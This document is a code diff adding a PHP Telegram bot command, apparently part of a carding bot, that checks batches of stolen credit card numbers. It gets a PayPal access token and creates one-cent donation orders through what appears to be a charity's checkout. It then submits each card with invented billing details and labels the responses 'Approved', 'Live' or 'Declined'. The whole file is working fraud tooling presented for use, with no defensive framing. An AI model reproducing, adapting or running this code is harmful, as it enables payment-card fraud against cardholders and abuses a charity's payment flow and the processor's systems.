@@ -1,0 +1,234 @@
+<?php
+list($cmd) = explode(" ", $message);
+if($cmd == "/mass3" or $cmd == ".mass3" or $cmd == "!mass3"){  
+$tiempo_inicial = microtime(true);
+    deleteprm($userId);
+    is_credits();
+    $NameGater ='MASS3';
+$gateway = '/mass3 :'.$NameGater;
+Contador($gateway);
+    deltecred($userId);
+    is_gateroff('mass3');
+    unlink(getcwd().'/cookie.txt');
+    $Mi_Id = "5168647868";
+        $targetas = substr($message, 6);
+    if (empty($targetas)){
+        reply_to($chatId, $message_id,$keyboard,'<b>Mass Auth%0AFormat: cc|m|y|cvv</b>');
+        die();
+    }
+    $bin = substr($targetas, 0,6);
+    $bines = bannedbin($bin);
+        if($bines == true){
+            reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
+            exit();
+        }
+#Verificador
+$antispmatim = antispamCheck($userId);
+    if($antispmatim != False ){
+       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
+        exit();
+    }
+$antispmatim = antispamCheckperemium($userId);
+    if($antispmatim != False ){
+       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
+        exit();
+    }
+#Rango 
+$nui = infouser($userId);
+    $Rank = $nui['apodo'];
+if($gId == $Mi_Id){
+    $Rank = "Owner";
+    $GLOBALS['Rank'] = $Rank;
+}elseif($userId == verifiAdmin($userId)){
+    $Rank ="Admin";
+    $GLOBALS['Rank'] = $Rank;
+}elseif($userId == veritimepremium($userId)){
+   $Rank = $nui['apodo'];
+}elseif($chatId == verifiCharAdmin($chatId)){
+    $Rank = "Free User";
+    $GLOBALS['Rank'] = $Rank;
+}
+elseif($userId == verificadroCrdediuser($userId)){
+    $Rank ="Free user";
+    $GLOBALS['Rank'] =$Rank;
+}
+
+#fin 
+
+
+    $m1 = bot("sendmessage", [
+        "chat_id" => $chatId,
+        "text" => "<b>ϟ CHECKING YOUR CARDS
+[ 🝂 WAIT A FEW SECONDS 🟥 ]
+Gateway » Mass Mccn
+CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>",
+        "parse_mode" => "html",
+        "reply_to_message_id" => $message_id,
+    ]);
+
+    $ms1 = capture(json_encode($m1), '"message_id":', ",");
+
+    $targetas = cleansix($targetas);
+    $allcards = multiexplode(["\n", " "], $targetas);
+
+if (count($allcards) <= 3) {
+    $resultados = "";
+    $num = 0;
+    foreach ($allcards as $card) {
+        $num = ++$num;
+        $resultados .= "<b>Card: <code>$card</code> \n" . cdmd78($card) . "</b>\n";
+    }
+
+    // Hacer una sola llamada a la API de Telegram para actualizar el mensaje
+    $tiempo_final = microtime(true);
+    $tiempo = $tiempo_final - $tiempo_inicial;
+    $tiempo = substr($tiempo, 0, 4);
+    $resultados .= "<b>－－－－－－－－－－－－－－－－
+Proxy  - 🝂 Live! ✅ 
+Time in Progress - 🝂 $tiempo s
+Checked by: <a href='tg://user?id=$userId'>$username</a>[$Rank]
+Bot by  - 🝂 Thkss
+－－－－－－－－－－－－－－－</b>";
+
+    // Actualizar el mensaje
+    bot("editMessageText", [
+        "chat_id" => $chatId,
+        "text" => $resultados,
+        "parse_mode" => "html",
+        "message_id" => $ms1,
+    ]);
+}
+ else {
+        bot("editMessageText", [
+            "chat_id" => $chatId,
+            "text" => "Error Maximo",
+            "parse_mode" => "html",
+            "message_id" => $ms1,
+        ]);
+    }
+}
+
+function cdmd78($lista)
+{
+    global $userId;
+
+    $separa = explode("|", $lista);
+    $cc = $separa[0];
+    $mes = $separa[1];
+    $ano = $separa[2];
+    $cvv = $separa[3];
+    
+$Idcooki = uniqid();
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=pill&style.tagline=false&style.height=25&style.menuPlacement=below&sdkVersion=5.0.325&components.0=buttons&locale.country=US&locale.lang=en&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVNHTndyU3ZubTBiTHNDQ28xQ29VNG9qbFVmcFpneUQzdWEyVElqT1pEZ3Q2NVB2OC1oN0FTTGhSQXJrejJGS1cwZk92TXhydWdESW5sMlUmY3VycmVuY3k9VVNEJmludGVudD1jYXB0dXJlJmNvbW1pdD10cnVlJmNvbXBvbmVudHM9YnV0dG9ucyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX3poZnprZXB4enBvbXVvcWlzZ3hoZmh2Ym13cmpoaiJ9fQ&clientID=ASGNwrSvnm0bLsCCo1CoU4ojlUfpZgyD3ua2TIjOZDgt65Pv8-h7ASLhRArkz2FKW0fOvMxrugDInl2U&sdkCorrelationID=f816867e4837c&storageID=uid_d743dcd82d_mji6mdc6mjc&sessionID=uid_fee5406f24_mji6mze6mta&buttonSessionID=uid_d56e3b2a15_mji6ndg6mju&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6dHJ1ZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmFyaWFudCI6bnVsbH19fSwiY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwiYnJhbmRlZCI6dHJ1ZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6dHJ1ZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ6aW1wbGVyIjp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1heGltYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvYmFuY2FyaW8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfSwibXVsdGliYW5jbyI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ&platform=desktop&remembered.0=venmo&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=venmo&renderedButtons.2=paylater&renderedButtons.3=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+$headers = array();
+$headers[] = 'authority: www.paypal.com';
+$headers[] = 'method: GET';
+$headers[] = 'path: /smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=pill&style.tagline=false&style.height=25&style.menuPlacement=below&sdkVersion=5.0.325&components.0=buttons&locale.country=US&locale.lang=en&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVNHTndyU3ZubTBiTHNDQ28xQ29VNG9qbFVmcFpneUQzdWEyVElqT1pEZ3Q2NVB2OC1oN0FTTGhSQXJrejJGS1cwZk92TXhydWdESW5sMlUmY3VycmVuY3k9VVNEJmludGVudD1jYXB0dXJlJmNvbW1pdD10cnVlJmNvbXBvbmVudHM9YnV0dG9ucyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX3poZnprZXB4enBvbXVvcWlzZ3hoZmh2Ym13cmpoaiJ9fQ&clientID=ASGNwrSvnm0bLsCCo1CoU4ojlUfpZgyD3ua2TIjOZDgt65Pv8-h7ASLhRArkz2FKW0fOvMxrugDInl2U&sdkCorrelationID=f816867e4837c&storageID=uid_d743dcd82d_mji6mdc6mjc&sessionID=uid_fee5406f24_mji6mze6mta&buttonSessionID=uid_d56e3b2a15_mji6ndg6mju&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6dHJ1ZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmFyaWFudCI6bnVsbH19fSwiY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwiYnJhbmRlZCI6dHJ1ZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6dHJ1ZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ6aW1wbGVyIjp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1heGltYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvYmFuY2FyaW8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfSwibXVsdGliYW5jbyI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ&platform=desktop&remembered.0=venmo&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=venmo&renderedButtons.2=paylater&renderedButtons.3=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true';
+$headers[] = 'scheme: https';
+$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+$headers[] = 'accept-language: en-US,en;q=0.9';
+$headers[] = 'referer: https://villagevolunteers.org/';
+$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+$curl = curl_exec($ch);
+$bearer = trim(strip_tags(getStr($curl, '"facilitatorAccessToken":"', '",')));
+
+//////////////////////////////
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/v2/checkout/orders');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'authority: www.paypal.com';
+$headers[] = 'method: POST';
+$headers[] = 'path: /v2/checkout/orders';
+$headers[] = 'scheme: https';
+$headers[] = 'accept: application/json';
+$headers[] = 'accept-language: en-US,en;q=0.9';
+$headers[] = 'authorization: Bearer '.$bearer.'';
+$headers[] = 'content-type: application/json';
+$headers[] = 'origin: https://www.paypal.com';
+$headers[] = 'paypal-partner-attribution-id';
+$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36';
+$headers[] = 'prefer: return=representation';
+$headers[] = 'referer: https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=pill&style.tagline=false&style.height=25&style.menuPlacement=below&sdkVersion=5.0.325&components.0=buttons&locale.country=US&locale.lang=en&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVNHTndyU3ZubTBiTHNDQ28xQ29VNG9qbFVmcFpneUQzdWEyVElqT1pEZ3Q2NVB2OC1oN0FTTGhSQXJrejJGS1cwZk92TXhydWdESW5sMlUmY3VycmVuY3k9VVNEJmludGVudD1jYXB0dXJlJmNvbW1pdD10cnVlJmNvbXBvbmVudHM9YnV0dG9ucyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX3poZnprZXB4enBvbXVvcWlzZ3hoZmh2Ym13cmpoaiJ9fQ&clientID=ASGNwrSvnm0bLsCCo1CoU4ojlUfpZgyD3ua2TIjOZDgt65Pv8-h7ASLhRArkz2FKW0fOvMxrugDInl2U&sdkCorrelationID=f816867e4837c&storageID=uid_d743dcd82d_mji6mdc6mjc&sessionID=uid_fee5406f24_mji6mze6mta&buttonSessionID=uid_d56e3b2a15_mji6ndg6mju&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6dHJ1ZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmFyaWFudCI6bnVsbH19fSwiY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwiYnJhbmRlZCI6dHJ1ZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6dHJ1ZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ6aW1wbGVyIjp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1heGltYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvYmFuY2FyaW8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfSwibXVsdGliYW5jbyI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ&platform=desktop&remembered.0=venmo&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=venmo&renderedButtons.2=paylater&renderedButtons.3=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"purchase_units":[{"amount":{"value":"0.01","currency_code":"USD"},"description":"donation -Where it’s needed most"}],"intent":"CAPTURE","application_context":{}}');
+$curl = curl_exec($ch);
+$id = trim(strip_tags(getStr($curl, '{"id":"', '"')));
+   
+////////////////////////////
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'accept: */*';
+$headers[] = 'accept-language: en-US,en;q=0.9';
+$headers[] = 'content-type: application/json';
+$headers[] = 'origin: https://www.paypal.com';
+$headers[] = 'paypal-client-context: '.$id.'';
+$headers[] = 'paypal-client-metadata-id: '.$id.'';
+$headers[] = 'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_fee5406f24_mji6mze6mta&buttonSessionID=uid_d56e3b2a15_mji6ndg6mju&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVNHTndyU3ZubTBiTHNDQ28xQ29VNG9qbFVmcFpneUQzdWEyVElqT1pEZ3Q2NVB2OC1oN0FTTGhSQXJrejJGS1cwZk92TXhydWdESW5sMlUmY3VycmVuY3k9VVNEJmludGVudD1jYXB0dXJlJmNvbW1pdD10cnVlJmNvbXBvbmVudHM9YnV0dG9ucyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX3poZnprZXB4enBvbXVvcWlzZ3hoZmh2Ym13cmpoaiJ9fQ&disable-card=&token='.$id.'';
+$headers[] = 'sec-fetch-site: same-origin';
+$headers[] = 'x-app-name: standardcardfields';
+$headers[] = 'x-country: US';
+$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"'.$id.'","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","postalCode":"94502","securityCode":"'.$cvv.'"},"phoneNumber":"2344637373","firstName":"andres","lastName":"rojas","billingAddress":{"givenName":"andres","familyName":"rojas","line1":"72 Salmon Road","line2":"72 Salmon Road","city":"Alameda","state":"CA","postalCode":"94502","country":"US"},"shippingAddress":{"givenName":"andres","familyName":"rojas","line1":"72 Salmon Road","line2":"72 Salmon Road","city":"Alameda","state":"CA","postalCode":"94502","country":"US"},"email":"jsentauro'.$cvv.'@gmail.com","currencyConversionType":"PAYPAL"},"operationName":null}');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+$result2 = curl_exec($ch);
+$mgs = trim(strip_tags(getStr($result2, '"code":"', '"')));  
+$mgs1 = trim(strip_tags(getStr($result2, '"message":"', '"'))); 
+
+
+if ((strpos($result2, "INVALID_SECURITY_CODE")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
+$status = "Approved! CNN 🟩";
+$response = "INVALID_SECURITY_CODE 🟩";
+}elseif ((strpos($result2, 'INVALID_BILLING_ADDRESS')) || (strpos($result2, 'insufficient_funds'))){ 
+$status = "Approved!🟩";
+$response = "INVALID_BILLING_ADDRESS!🟩";
+}
+elseif (strpos($result2, 'EXISTING_ACCOUNT_RESTRICTED')){ 
+$status = "Live! 🟩";
+$response = "EXISTING_ACCOUNT_RESTRICTED";
+}
+elseif (strpos($result2, "card_error_authentication_required") ||(strpos($result2,'three_d_secure_redirect'))){ 
+$status = "[ DECLINED 🔴 ]";
+$response = "3D Card.❌";
+}elseif (strpos($result2, "Insufficient funds in the account")){ 
+$status = "Approved!🟩";
+$response = "Insufficient funds in the account";
+}elseif (strpos($result2, "CARD_GENERIC_ERROR")){ 
+$status = "[ DECLINED 🔴 ]";
+$response = "CARD_GENERIC_ERROR";
+}else{
+$status = "[ DECLINED 🔴 ]";
+$response = $mgs;
+   }
+
+    return "Status - 🝂 $status
+Response - 🝂 $response - $mgs1";
+}
+
